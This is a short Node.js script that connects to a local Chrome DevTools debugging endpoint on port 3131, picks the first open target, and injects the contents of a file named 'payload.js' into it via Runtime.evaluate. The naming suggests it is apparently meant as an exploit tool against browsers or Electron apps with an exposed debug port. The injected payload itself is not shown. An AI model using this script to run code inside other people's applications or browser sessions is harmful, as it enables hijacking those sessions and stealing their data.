const http = require("http");
const WebSocket = require("ws");
const fs = require("fs");

const options = {
    hostname: "localhost",
    port: 3131,
    path: "/json",
    method: "GET"
};

http.get('http://localhost:3131/json', res => {
    let data = [];
    console.log('Status Code:', res.statusCode);

    res.on('data', chunk => {
        data.push(chunk);
    });

    res.on('end', () => {
        const json = JSON.parse(data.toString());
        console.log(json);
        sendJS(json[0]);
    });
}).on('error', err => {
    console.log('Error: ', err.message);
});

function sendJS(window) {
    const ws = new WebSocket(window.webSocketDebuggerUrl);
    const payload = {
        "id": 1337,
        "method": "Runtime.evaluate",
        "params": { "expression": fs.readFileSync("payload.js").toString() }
    };
    console.log(payload);
    ws.on("open", () => {
        ws.send(JSON.stringify(payload));
        ws.close();
    });
}